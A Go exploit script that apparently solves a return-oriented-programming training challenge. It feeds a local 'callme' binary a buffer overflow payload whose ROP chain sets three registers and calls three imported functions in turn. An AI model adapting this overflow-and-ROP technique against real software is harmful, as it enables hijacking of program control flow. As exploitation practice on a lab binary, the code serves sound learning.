package main

import (
    "log"
    "bufio"
    "os/exec"
    "fmt"
)

func main() {
    binary := "./callme"
    log.Println("Executing", binary, "\n")
    cmd :=  exec.Command(binary)
    stdin, err := cmd.StdinPipe()
    if err != nil {
        log.Fatal(err)
    }
    stdout, err := cmd.StdoutPipe()
    if err != nil {
        log.Fatal(err)
    }
    if err = cmd.Start(); err != nil {
        log.Fatal(err)
    }

    // Read the initial output
    r := bufio.NewReader(stdout)
    _, err = r.ReadBytes('>')
    if err != nil {
        log.Fatal(err)
    }

    // write buffer
    var buf string
    for  i := 0; i < 40; i++ {
        buf += "A"
    }
    // pop rdi (arg1), rsi (arg2), rdx (arg3), ret
    loadRegsRet := "\xb0\x1a\x40\x00\x00\x00\x00\x00"

    // sym.imp.callme_one
    buf += loadRegsRet
    padding3Register := "\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00"
    buf += padding3Register
    buf += "\x50\x18\x40\x00\x00\x00\x00\x00"
    // sym.imp.callme_two
    buf += loadRegsRet
    buf += padding3Register
    buf += "\x70\x18\x40\x00\x00\x00\x00\x00"
    // sym.imp.callme_three
    buf += loadRegsRet
    buf += padding3Register
    buf += "\x10\x18\x40\x00\x00\x00\x00\x00"

    buf += "\n"
    stdin.Write([]byte(buf))

    // Read output
    r = bufio.NewReader(stdout)
    for {
        b, err := r.ReadByte()
        if err != nil {
            fmt.Println()
            log.Fatal(err)
        }
        fmt.Printf(string(b))
    }
}
